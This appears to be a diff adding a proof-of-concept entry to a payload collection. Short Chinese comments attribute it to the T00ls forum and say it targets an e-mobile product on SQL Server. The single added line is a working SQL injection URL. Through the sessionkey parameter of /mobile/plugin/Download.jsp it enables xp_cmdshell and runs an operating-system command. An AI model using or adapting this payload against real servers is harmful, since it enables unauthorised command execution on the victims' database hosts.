@@ -1,0 +1,5 @@
+# 应该是只存于e-mobile
+# sql server
+# 来源 T00ls
+
+/mobile/plugin/Download.jsp?sessionkey=1'%20EXEC%20sp_configure%20'show%20advanced%20options',1%20RECONFIGURE%20EXEC%20sp_configure%20'xp_cmdshell',1%20RECONFIGURE%20exec%20master..xp_cmdshell%20'id
